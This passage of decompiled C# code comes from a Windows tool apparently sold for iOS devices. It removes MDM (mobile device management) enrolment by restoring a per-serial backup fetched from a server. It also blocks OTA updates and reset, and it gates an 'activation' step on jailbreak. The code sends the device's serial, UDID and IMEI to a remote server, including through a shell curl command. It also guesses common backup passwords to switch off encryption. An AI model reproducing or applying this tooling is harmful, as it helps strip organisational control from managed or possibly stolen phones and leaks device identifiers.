					{
						Console.WriteLine("Error al cerrar el proceso " + processName + ": " + ex2.Message);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error al buscar procesos " + processName + ": " + ex.Message);
			}
		}

		private void CloseExitAPP(string processName)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			foreach (Process process in processesByName)
			{
				try
				{
					process.Kill();
					Console.WriteLine("Proceso " + processName + " cerrado.");
				}
				catch (Exception ex)
				{
					Console.WriteLine("No se pudo cerrar el proceso " + processName + ": " + ex.Message);
				}
			}
		}

		private void guna2CircleButton1_Click(object sender, EventArgs e)
		{
			CloseApplication();
		}

		private void guna2CircleButton2_Click(object sender, EventArgs e)
		{
			((Form)this).WindowState = (FormWindowState)1;
		}

		private void guna2ImageButton2_Click(object sender, EventArgs e)
		{
			((Form)this).WindowState = (FormWindowState)1;
		}

		private void metroButton1_Click_1(object sender, EventArgs e)
		{
			CloseApplication();
		}

		private void metroButton2_Click(object sender, EventArgs e)
		{
			((Form)this).WindowState = (FormWindowState)1;
		}

		private async void guna2GradientButton2_Click_1(object sender, EventArgs e)
		{
		}

		private async void guna2GradientButton3_Click_1(object sender, EventArgs e)
		{
		}

		private async void guna2GradientButton5_Click_1(object sender, EventArgs e)
		{
			await ProcessActivation();
		}

		private void guna2GradientButton1_Click(object sender, EventArgs e)
		{
			ValidateDeviceConnection();
		}

		private void guna2GradientButton3_Click(object sender, EventArgs e)
		{
			ValidateDeviceConnection();
		}

		private void CloseApplication()
		{
			processKilled = false;
			try
			{
				CloseProcessByName("idevicebackup");
				CloseProcessByName("idevicebackup2");
				CloseProcessByName("iproxy");
				CloseProcessByName("ideviceinfo");
				Application.Exit();
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error al cerrar la aplicación: " + ex.Message);
			}
			if (processKilled)
			{
				Console.WriteLine("Se cerraron algunos procesos relacionados antes de salir.");
			}
			else
			{
				Console.WriteLine("No se cerraron procesos relacionados.");
			}
		}

		private async Task ProcessActivation()
		{
			_ = currentiOSDevice.SerialNumber;
			string status = "NAUTHORIZED";
			if (status == "NOT_AUTHORIZED")
			{
				MessageBox.Show("Serial not authorized. Please register it on the page.", "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return;
			}
			ClearTxtLog();
			if (await CheckJailbreak())
			{
				await ActivateSignal();
				return;
			}
			InsertLabelText("No jailbreak detected. Please check your device..", Color.Red);
			MessageBox.Show("No jailbreak detected. Please check your device.", "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}

		private async Task ProcessMDMUnlock()
		{
			if (currentiOSDevice == null || string.IsNullOrEmpty(currentiOSDevice.ProductType))
			{
				MessageBox.Show("⚠\ufe0f Please connect the device first.", "Device Connection", (MessageBoxButtons)0, (MessageBoxIcon)48);
				return;
			}
			string serial = currentiOSDevice.SerialNumber;
			await Encryptation();
			if (await SerialCheckingPRO(serial) == "NOT_AUTHORIZED")
			{
				Clipboard.SetText(serial);
				MessageBox.Show("Serial: " + serial + " is not authorized. Please register it on the page.\n\nThe serial has been copied to the clipboard.", "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				ClearTxtLog();
				await MDMRemote();
			}
		}

		private async Task OTABlockSystem()
		{
			if (currentiOSDevice == null || string.IsNullOrEmpty(currentiOSDevice.ProductType))
			{
				MessageBox.Show("⚠\ufe0f Please connect the device first.", "Device Connection", (MessageBoxButtons)0, (MessageBoxIcon)48);
				return;
			}
			string serial = currentiOSDevice.SerialNumber;
			await Encryptation();
			if (await SerialCheckingPRO(serial) == "NOT_AUTHORIZED")
			{
				Clipboard.SetText(serial);
				MessageBox.Show("Serial: " + serial + " is not authorized. Please register it on the page.\n\nThe serial has been copied to the clipboard.", "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				ClearTxtLog();
				await OTABlock();
			}
		}

		public static async Task RestoreBackupCMD(string command)
		{
			Process process = new Process();
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", "/c " + command)
				{
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				process.StartInfo = processStartInfo;
				try
				{
					process.Start();
					Task<string> outputTask = process.StandardOutput.ReadToEndAsync();
					Task<string> errorTask = process.StandardError.ReadToEndAsync();
					Task waitTask = Task.Run(delegate
					{
						process.WaitForExit();
					});
					await Task.WhenAll(waitTask, outputTask, errorTask);
					string output = await outputTask;
					string error = await errorTask;
					if (!string.IsNullOrEmpty(output))
					{
						Console.WriteLine(output);
					}
					if (!string.IsNullOrEmpty(error))
					{
						Console.WriteLine("Error: " + error);
						if (error.Contains("error Device could not be activated, Maybe FMI is turned on"))
						{
							MessageBox.Show("Please disable FMI before proceeding", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine("An exception occurred: " + ex.Message);
				}
			}
			finally
			{
				if (process != null)
				{
					((IDisposable)process).Dispose();
				}
			}
		}

		public async Task DownloadFileMDM(string link, string outputPath)
		{
			if (File.Exists(outputPath))
			{
				File.Delete(outputPath);
			}
			isDownloading = true;
			DownloadConfiguration val = new DownloadConfiguration();
			val.BufferBlockSize = 42000;
			val.MaxTryAgainOnFailover = 100;
			val.Timeout = 30000;
			RequestConfiguration val2 = new RequestConfiguration();
			val2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.3";
			val2.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			val2.KeepAlive = true;
			val.RequestConfiguration = val2;
			DownloadConfiguration downloadOpt = val;
			string uniqueLink = $"{link}?_ts={DateTime.UtcNow.Ticks}";
			downloadOpt.RequestConfiguration.Headers.Add("Accept-Language", "en-US,en;q=0.5");
			DownloadService downloader = new DownloadService(downloadOpt);
			((AbstractDownloadService)downloader).DownloadProgressChanged += (EventHandler<Downloader.DownloadProgressChangedEventArgs>)OnDownloadProgressChanged;
			((AbstractDownloadService)downloader).DownloadFileCompleted += (EventHandler<AsyncCompletedEventArgs>)OnDownloadFileCompleted;
			await ((AbstractDownloadService)downloader).DownloadFileTaskAsync(uniqueLink, outputPath, default(CancellationToken));
		}

		public async Task DownloadFileMDM1(string link, string outputPath)
		{
			if (File.Exists(outputPath))
			{
				File.Delete(outputPath);
			}
			isDownloading = true;
			DownloadConfiguration val = new DownloadConfiguration();
			val.BufferBlockSize = 42000;
			val.MaxTryAgainOnFailover = 100;
			val.Timeout = 30000;
			RequestConfiguration val2 = new RequestConfiguration();
			val2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.3";
			val2.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			val2.KeepAlive = true;
			val.RequestConfiguration = val2;
			DownloadConfiguration downloadOpt = val;
			string uniqueLink = $"{link}?_ts={DateTime.UtcNow.Ticks}";
			downloadOpt.RequestConfiguration.Headers.Add("Accept-Language", "en-US,en;q=0.5");
			DownloadService downloader = new DownloadService(downloadOpt);
			((AbstractDownloadService)downloader).DownloadProgressChanged += (EventHandler<Downloader.DownloadProgressChangedEventArgs>)OnDownloadProgressChanged;
			((AbstractDownloadService)downloader).DownloadFileCompleted += (EventHandler<AsyncCompletedEventArgs>)OnDownloadFileCompleted;
			await ((AbstractDownloadService)downloader).DownloadFileTaskAsync(uniqueLink, outputPath, default(CancellationToken));
		}

		public async Task Decryptation()
		{
			await Task.Run(async delegate
			{
				await ExecuteProcess("-i encryption off 1234");
				await ExecuteProcess("-i encryption off 123");
				await ExecuteProcess("-i encryption off 1111");
			});
		}

		private async Task ExecuteProcess(string arguments)
		{
			using Process process = new Process();
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			string archFolder = (Environment.Is64BitOperatingSystem ? "win-x64" : "win-x86");
			process.StartInfo.FileName = Path.Combine(Directory.GetCurrentDirectory(), archFolder, "idevicebackup2.exe");
			process.StartInfo.Arguments = arguments;
			process.OutputDataReceived += async delegate(object sender, DataReceivedEventArgs e)
			{
				if (!string.IsNullOrEmpty(e.Data))
				{
					Console.WriteLine(e.Data);
					if ((e.Data!.Contains("ERROR: Backup encryption is not enabled.") || e.Data!.StartsWith("Error: ")) && !processKilled)
					{
						await KillProcess("idevicebackup2.exe");
						processKilled = true;
					}
				}
			};
			process.Start();
			process.BeginOutputReadLine();
			process.WaitForExit();
		}

		private async Task<bool> OTABlock()
		{
			try
			{
				_ = 10;
				bool result;
				try
				{
					Console.WriteLine("[Starting OTA blocking process...]");
					InsertLabelText("Starting OTA blocking process...", Color.Black);
					ProgressTask(5);
					Console.WriteLine("Retrieving device information...");
					InsertLabelText("Retrieving device information...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(10);
					string serialNumber = currentiOSDevice.SerialNumber;
					string udid = currentiOSDevice.UniqueDeviceID;
					string productType = currentiOSDevice.ProductType;
					string productVersion = currentiOSDevice.ProductVersion;
					string imei = currentiOSDevice.InternationalMobileEquipmentIdentity;
					string buildVersion = currentiOSDevice.BuildVersion;
					Console.WriteLine("Device Information:\nSerial Number: " + serialNumber + "\nUDID: " + udid + "\nProduct Type: " + productType + "\nProduct Version: " + productVersion + "\nIMEI: " + imei + "\nBuild Version: " + buildVersion);
					InsertLabelText("Device detected: " + productType + " - iOS " + productVersion, Color.Black);
					ProgressTask(15);
					Console.WriteLine("Device information successfully retrieved.");
					InsertLabelText("Device information successfully retrieved.", Color.Black);
					await Task.Delay(1000);
					ProgressTask(20);
					Console.WriteLine("Verifying OTA backup files...");
					InsertLabelText("Verifying OTA backup files...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(25);
					if (!Directory.Exists(RutaOTA))
					{
						Console.WriteLine("Error: OTA directory not found: " + RutaOTA);
						InsertLabelText("Error: OTA blocking directory not found.", Color.Red);
						ProgressTask(0);
						throw new Exception("OTA directory not found: " + RutaOTA);
					}
					string otaBackupPath = Path.Combine(RutaOTA, "ad09186179f31a88dd6ee2c8f2d034025f54c82a");
					if (!Directory.Exists(otaBackupPath))
					{
						Console.WriteLine("Error: OTA blocking path not found: " + otaBackupPath);
						InsertLabelText("Error: OTA blocking files not found.", Color.Red);
						ProgressTask(0);
						throw new Exception("OTA blocking path not found: " + otaBackupPath);
					}
					Console.WriteLine("OTA blocking files verified successfully.");
					InsertLabelText("OTA blocking files verified successfully.", Color.Black);
					await Task.Delay(1000);
					ProgressTask(40);
					Console.WriteLine("Checking OTA blocking configuration...");
					InsertLabelText("Checking OTA blocking configuration...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(50);
					string[] requiredFiles = Directory.GetFiles(otaBackupPath, "*.plist", SearchOption.AllDirectories);
					if (requiredFiles.Length == 0)
					{
						Console.WriteLine("Warning: No .plist files found in OTA blocking directory");
						InsertLabelText("Warning: OTA blocking configuration may be incomplete", Color.Orange);
					}
					else
					{
						Console.WriteLine($"Found {requiredFiles.Length} configuration files in OTA blocking directory");
						InsertLabelText($"OTA blocking configuration verified ({requiredFiles.Length} config files found)", Color.Black);
					}
					ProgressTask(60);
					await Task.Delay(1000);
					Console.WriteLine("Preparing OTA blocking command...");
					InsertLabelText("Preparing device for OTA blocking...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(70);
					string archFolder = (Environment.Is64BitOperatingSystem ? "win-x64" : "win-x86");
					string ideviceCommand = archFolder + "\\idevicebackup2.exe --udid " + udid + " --source ad09186179f31a88dd6ee2c8f2d034025f54c82a restore --system --skip-apps \"" + RutaOTA + "\"";
					Console.WriteLine("OTA blocking command: " + ideviceCommand);
					InsertLabelText("Applying OTA blocking configuration (this may take several minutes)...", Color.Black);
					ProgressTask(75);
					Console.WriteLine("Executing OTA blocking command...");
					await Task.Delay(2000);
					ProgressTask(80);
					string output = await ShellCMDAsync(ideviceCommand);
					if (output.Contains("No Info.plist found for UDID"))
					{
						Console.WriteLine("Error: The necessary file for OTA blocking was not found.");
						InsertLabelText("Error: OTA blocking file not found. Please check configuration.", Color.Red);
						ProgressTask(0);
						result = false;
					}
					else if (output.Contains("error") || output.Contains("failed"))
					{
						Console.WriteLine("OTA blocking error detected: " + output);
						InsertLabelText("Error occurred during OTA blocking. Check device connection.", Color.Red);
						ProgressTask(0);
						result = false;
					}
					else
					{
						ProgressTask(90);
						Console.WriteLine("OTA blocking command executed successfully.");
						InsertLabelText("OTA blocking applied successfully!", Color.Black);
						await Task.Delay(2000);
						Console.WriteLine("Finalizing OTA blocking process...");
						InsertLabelText("Finalizing OTA blocking process...", Color.Black);
						ProgressTask(95);
						await Task.Delay(1000);
						Console.WriteLine("[OTA blocking process completed successfully]");
						InsertLabelText("OTA blocking process completed successfully!", Color.Green);
						ProgressTask(100);
						MessageBox.Show("OTA / Reset blocking process completed successfully!\n\nOTA updates are now blocked on your device.", "OTA / Reset  Block Success", (MessageBoxButtons)0, (MessageBoxIcon)64);
						result = true;
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine("Error during OTA blocking process: " + ex.Message);
					InsertLabelText("Error: " + ex.Message, Color.Red);
					ProgressTask(0);
					MessageBox.Show("An error occurred during the OTA blocking process:\n\n" + ex.Message, "OTA Block Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
					result = false;
				}
				return result;
			}
			finally
			{
				Console.WriteLine("[Finalizing OTA blocking process...]");
				InsertLabelText("Finalizing process...", Color.Black);
				await Task.Delay(3000);
			}
		}

		private async Task<bool> MDMRemote()
		{
			try
			{
				_ = 18;
				bool result;
				try
				{
					Console.WriteLine("[Starting MDM unlocking process...]");
					InsertLabelText("Starting MDM unlocking process...", Color.Black);
					ProgressTask(5);
					Console.WriteLine("Retrieving device information...");
					InsertLabelText("Retrieving device information...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(10);
					string serialNumber = currentiOSDevice.SerialNumber;
					string udid = currentiOSDevice.UniqueDeviceID;
					string productType = currentiOSDevice.ProductType;
					string productVersion = currentiOSDevice.ProductVersion;
					string imei = currentiOSDevice.InternationalMobileEquipmentIdentity;
					string buildVersion = currentiOSDevice.BuildVersion;
					Console.WriteLine("Device Information:\nSerial Number: " + serialNumber + "\nUDID: " + udid + "\nProduct Type: " + productType + "\nProduct Version: " + productVersion + "\nIMEI: " + imei + "\nBuild Version: " + buildVersion);
					InsertLabelText("Device detected: " + productType + " - iOS " + productVersion, Color.Black);
					ProgressTask(15);
					Console.WriteLine("Device information successfully retrieved.");
					InsertLabelText("Device information successfully retrieved.", Color.Black);
					await Task.Delay(1000);
					ProgressTask(20);
					Console.WriteLine("Preparing necessary files...");
					InsertLabelText("Preparing necessary files...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(25);
					string zipFilePath = Path.Combine(RutaMDM, "MDM_" + serialNumber + ".zip");
					if (File.Exists(zipFilePath))
					{
						Console.WriteLine("Deleting previous temporary files: " + zipFilePath);
						InsertLabelText("Cleaning previous temporary files...", Color.Black);
						File.Delete(zipFilePath);
						ProgressTask(28);
					}
					if (Directory.Exists(RutaMDMUnzip))
					{
						Console.WriteLine("Deleting previous temporary folder: " + RutaMDMUnzip);
						InsertLabelText("Removing temporary folders...", Color.Black);
						Directory.Delete(RutaMDMUnzip, recursive: true);
						ProgressTask(30);
					}
					Console.WriteLine("Temporary files successfully cleaned.");
					InsertLabelText("Temporary files successfully cleaned.", Color.Black);
					await Task.Delay(1000);
					ProgressTask(35);
					Console.WriteLine("Connecting to MDM server...");
					InsertLabelText("Connecting to MDM server...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(40);
					InsertLabelText("Sending device data to server...", Color.Black);
					bool downloadSuccess = await TryDownloadWithPost("https://google.com", "TemporaryFile", new Dictionary<string, string>
					{
						{ "serial", serialNumber },
						{ "uuid", udid },
						{ "type", productType },
						{ "ver", productVersion },
						{ "ime", imei },
						{ "build", buildVersion }
					});
					ProgressTask(45);
					if (!downloadSuccess)
					{
						Console.WriteLine("POST method failed. Trying GET method...");
						InsertLabelText("Trying alternative connection method...", Color.Black);
						downloadSuccess = await TryDownloadWithGet("https://google.com", "TemporaryFile");
						ProgressTask(48);
					}
					if (downloadSuccess)
					{
						Console.WriteLine("Data successfully downloaded.");
						InsertLabelText("Server connection successful.", Color.Black);
						await Task.Delay(2000);
						ProgressTask(50);
					}
					else
					{
						Console.WriteLine("Error downloading data. Attempting alternative method...");
						InsertLabelText("Attempting alternative download method...", Color.Black);
						try
						{
							string archFolder2 = (Environment.Is64BitOperatingSystem ? "win-x64" : "win-x86");
							string curlCommand = ".\\" + archFolder2 + "\\curl.exe -s \"https://google.com/serial=" + serialNumber + "&uuid=" + udid + "&type=" + productType + "&ver=" + productVersion + "&ime=" + imei + "&build=" + buildVersion + "\"";
							await ShellCMDAsync(curlCommand);
							Console.WriteLine("Alternative method completed successfully.");
							InsertLabelText("Alternative method successful.", Color.Black);
							ProgressTask(50);
						}
						catch (Exception curlEx)
						{
							Console.WriteLine("Error during alternative method (CURL): " + curlEx.Message);
							InsertLabelText("Connection error. Please check your internet.", Color.Red);
							ProgressTask(0);
							result = false;
							goto end_IL_0082;
						}
					}
					Console.WriteLine("Preparing restoration file...");
					InsertLabelText("Preparing restoration file...", Color.Black);
					await Task.Delay(3000);
					ProgressTask(55);
					string restorationUrl = "https://google.com/mdm/cdn_server/MDM_API/Backups/MDM_" + serialNumber + ".zip";
					Console.WriteLine("Downloading restoration file from URL: " + restorationUrl);
					InsertLabelText("Downloading MDM configuration file...", Color.Black);
					ProgressTask(60);
					await DownloadFileMDM1(restorationUrl, Path.Combine(RutaMDM, "MDM_" + serialNumber + ".zip"));
					Console.WriteLine("Restoration file downloaded successfully.");
					InsertLabelText("Configuration file downloaded successfully.", Color.Black);
					await Task.Delay(1000);
					ProgressTask(70);
					if (!File.Exists(Path.Combine(RutaMDM, "MDM_" + serialNumber + ".zip")))
					{
						Console.WriteLine("Error: Could not download the restoration file.");
						InsertLabelText("Error: Could not download the restoration file.", Color.Red);
						ProgressTask(0);
						throw new Exception("Download failed: MDM ZIP file not found.");
					}
					Console.WriteLine("Extracting restoration file...");
					InsertLabelText("Extracting configuration files...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(75);
					string zipFile = Path.Combine(RutaMDM, "MDM_" + serialNumber + ".zip");
					ZipFile.ExtractToDirectory(zipFile, RutaMDMUnzip);
					Console.WriteLine("Restoration file extracted successfully.");
					InsertLabelText("Files extracted successfully.", Color.Black);
					await Task.Delay(1000);
					ProgressTask(80);
					Console.WriteLine("Processing data...");
					InsertLabelText("Processing MDM configuration data...", Color.Black);
					await Decryptation();
					Console.WriteLine("Data processed successfully.");
					InsertLabelText("Configuration data processed successfully.", Color.Black);
					await Task.Delay(3000);
					ProgressTask(85);
					Console.WriteLine("Starting device restoration...");
					InsertLabelText("Starting device restoration (this may take several minutes)...", Color.Black);
					await Task.Delay(1000);
					ProgressTask(90);
					string ideviceCommand = (Environment.Is64BitOperatingSystem ? "win-x64" : "win-x86") + "\\idevicebackup2.exe restore --udid " + udid + " --source ffe2017db9c5071adfa1c23d3769970f7524a9d4 --system --reboot --settings \"" + RutaMDM + "\"";
					if ((await ShellCMDAsync(ideviceCommand)).Contains("No Info.plist found for UDID"))
					{
						Console.WriteLine("Error: The necessary file for restoration was not found.");
						InsertLabelText("Error: Restoration file not found. Please try again.", Color.Red);
						ProgressTask(0);
						result = false;
					}
					else
					{
						Console.WriteLine("Restoration completed successfully.");
						InsertLabelText("Device restoration completed successfully!", Color.Black);
						await Task.Delay(2000);
						ProgressTask(95);
						Console.WriteLine("[MDM process completed successfully]");
						InsertLabelText("MDM removal process completed successfully!", Color.Green);
						ProgressTask(100);
						MessageBox.Show("MDM process completed successfully!", "Success", (MessageBoxButtons)0, (MessageBoxIcon)64);
						result = true;
					}
					end_IL_0082:;
				}
				catch (Exception ex)
				{
					Console.WriteLine("Error during process: " + ex.Message);
					InsertLabelText("Error: " + ex.Message, Color.Red);
					ProgressTask(0);
					MessageBox.Show("An error occurred during the MDM process:\n" + ex.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
					result = false;
				}
				return result;
			}
			finally
			{
				Console.WriteLine("[Finalizing MDM process...]");
				InsertLabelText("Finalizing process...", Color.Black);
				await Task.Delay(5000);
			}
		}

		private static string ToQueryString(Dictionary<string, string> parameters)
		{
			string[] array = Enumerable.ToArray(Enumerable.Select(parameters, (KeyValuePair<string, string> kvp) => Uri.EscapeDataString(kvp.Key) + "=" + Uri.EscapeDataString(kvp.Value)));
			return string.Join("&", array);
		}

		public async Task<bool> TryDownloadWithPost(string downloadUrl, string outputPath, Dictionary<string, string> postData)
		{
			try
			{
				await SenderMDM(downloadUrl, outputPath, postData);
				return true;
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error during POST download: " + ex.Message);
				return false;
			}
		}

		public async Task SenderMDM(string link, string outputPath, Dictionary<string, string> postData)
		{
			if (File.Exists(outputPath))
			{
				File.Delete(outputPath);
			}
			isDownloading = true;
			DownloadConfiguration val = new DownloadConfiguration();
			val.BufferBlockSize = 42000;
			val.MaxTryAgainOnFailover = 100;
			val.Timeout = 30000;
			RequestConfiguration val2 = new RequestConfiguration();
			val2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.3";
			val2.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			val2.KeepAlive = true;
			val.RequestConfiguration = val2;
			DownloadConfiguration downloadOpt = val;
			string uniqueLink = $"{link}?_ts={DateTime.UtcNow.Ticks}";
			downloadOpt.RequestConfiguration.Headers.Add("Accept-Language", "en-US,en;q=0.5");
			HttpClient client = new HttpClient();
			try
			{
				FormUrlEncodedContent content = new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)postData);
				((HttpContent)content).Headers.ContentType = new MediaTypeHeaderValue("application/x-www-form-urlencoded");
				HttpResponseMessage response = await client.PostAsync(uniqueLink, (HttpContent)(object)content);
				if (response.IsSuccessStatusCode)
				{
					Stream fileStream = await response.Content.ReadAsStreamAsync();
					using FileStream fileStreamOutput = new FileStream(outputPath, FileMode.Create);
					await fileStream.CopyToAsync(fileStreamOutput);
					Console.WriteLine("File downloaded successfully!");
				}
				else
				{
					Console.WriteLine($"Error during download. Status code: {response.StatusCode}");
				}
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
			isDownloading = false;
		}

		public async Task<bool> TryDownloadWithGet(string downloadUrl, string outputPath)
		{
			try
			{
				await SenderMDMGet(downloadUrl, outputPath);
				return true;
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error during GET download: " + ex.Message);
				return false;
			}
		}

		public async Task SenderMDMGet(string link, string outputPath)
		{
			if (File.Exists(outputPath))
			{
				File.Delete(outputPath);
			}
			isDownloading = true;
			DownloadConfiguration val = new DownloadConfiguration();
			val.BufferBlockSize = 42000;
			val.MaxTryAgainOnFailover = 100;
			val.Timeout = 30000;
			RequestConfiguration val2 = new RequestConfiguration();
			val2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.3";
			val2.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
			val2.KeepAlive = true;
			val.RequestConfiguration = val2;
			DownloadConfiguration downloadOpt = val;
			string uniqueLink = $"{link}?_ts={DateTime.UtcNow.Ticks}";
			downloadOpt.RequestConfiguration.Headers.Add("Accept-Language", "en-US,en;q=0.5");
			HttpClient client = new HttpClient();
			try
			{
				HttpResponseMessage response = await client.GetAsync(uniqueLink);
				if (response.IsSuccessStatusCode)
				{
					Stream fileStream = await response.Content.ReadAsStreamAsync();
					using FileStream fileStreamOutput = new FileStream(outputPath, FileMode.Create);
					await fileStream.CopyToAsync(fileStreamOutput);
					Console.WriteLine("File downloaded successfully!");
				}
				else
				{
					Console.WriteLine($"Error during download. Status code: {response.StatusCode}");
				}
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
			isDownloading = false;
		}

		private void ValidateDeviceConnection()
		{
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			if (string.IsNullOrWhiteSpace(((Control)ModeloffHello).Text) || ((Control)ModeloffHello).Text.Trim().ToLower() == "n/a")
			{
				MessageBox.Show("Please connect a device before continuing.", "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
		}

		private void PictureBox1_Click(object sender, EventArgs e)
		{
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			Clipboard.SetText(((Control)labelSN).Text);
			MessageBox.Show("\ud83d\udccb The serial number '" + ((Control)labelSN).Text + "' has been successfully copied to the clipboard. ✔\ufe0f", "\ud83d\udd11 Serial Number Copied", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}

		private void pictureBox3_Click(object sender, EventArgs e)
		{
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Unknown result type (might be due to invalid IL or missing references)
			if (currentiOSDevice == null || string.IsNullOrEmpty(currentiOSDevice.SerialNumber))
			{
				MessageBox.Show("⚠\ufe0f No device connected or no serial available.", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				return;
			}
			string serial = currentiOSDevice.SerialNumber;
			Clipboard.SetText(serial);
			MessageBox.Show("Serial " + serial + " has been copied to the clipboard.", "Serial Copied", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}

		private void pictureBox20_Click(object sender, EventArgs e)
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				Process.Start("https://t.me/rhcp011235");
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error opening page: " + ex.Message);
			}
		}

		private void label17_Click(object sender, EventArgs e)
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				Process.Start("https://rhcp011235.com");
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error opening page: " + ex.Message);
			}
		}

		private void guna2GradientPanel1_Paint(object sender, PaintEventArgs e)
		{
		}

		private void txtLog_TextChanged(object sender, EventArgs e)
		{
		}

		private async void guna2GradientButton5_Click(object sender, EventArgs e)
		{
		}

		private async void guna2GradientButton1_Click_1(object sender, EventArgs e)
		{
			await ProcessMDMUnlock();
		}

		private async void ActivateButton_Click(object sender, EventArgs e)
		{
			if (currentiOSDevice == null)
			{
				MessageBox.Show("No device connected.", "Activation", (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else
			{
				await ProcessActivation();
			}
		}

		private async Task ProgressTask(int targetValue)
		{
			int finalTarget = Math.Min(targetValue, 100);
			if (totalProgress >= finalTarget)
			{
				return;
			}
			while (totalProgress < finalTarget)
			{
				totalProgress++;
				if (((Control)Guna2ProgressBar1).InvokeRequired)
				{
					((Control)Guna2ProgressBar1).Invoke((Delegate)(Action)delegate
					{
						UpdateProgressUI(totalProgress);
					});
				}
				else
				{
					UpdateProgressUI(totalProgress);
				}
				await Task.Delay(15);
			}
		}

		private void UpdateProgressUI(int value)
		{
			Guna2ProgressBar1.Value = value;
		}

		private void Guna2ProgressBar1_ValueChanged(object sender, EventArgs e)
		{
		}

		private async void guna2GradientButton2_Click(object sender, EventArgs e)
		{
			await OTABlockSystem();
		}

		private void label1_Click(object sender, EventArgs e)
		{
		}

		private void label2_Click(object sender, EventArgs e)
		{
		}

		private void pictureBox8_Click(object sender, EventArgs e)
		{
		}

		private void labelSN_Click(object sender, EventArgs e)
		{
		}

		private void label20_Click(object sender, EventArgs e)
		{
		}

		private void pictureBox5_Click(object sender, EventArgs e)
		{
		}

		private void labelInfoProgres_Click(object sender, EventArgs e)
		{
		}

		private void label16_Click(object sender, EventArgs e)
		{
		}

		private void labelVersion_Click(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Expected O, but got Unknown
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Expected O, but got Unknown
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_0073: Expected O, but got Unknown
			//IL_007f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0089: Expected O, but got Unknown
			//IL_008a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0094: Expected O, but got Unknown
			//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b5: Expected O, but got Unknown
			//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c0: Expected O, but got Unknown
			//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f2: Expected O, but got Unknown
			//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
			//IL_00fd: Expected O, but got Unknown
			//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
			//IL_0108: Expected O, but got Unknown
			//IL_0109: Unknown result type (might be due to invalid IL or missing references)
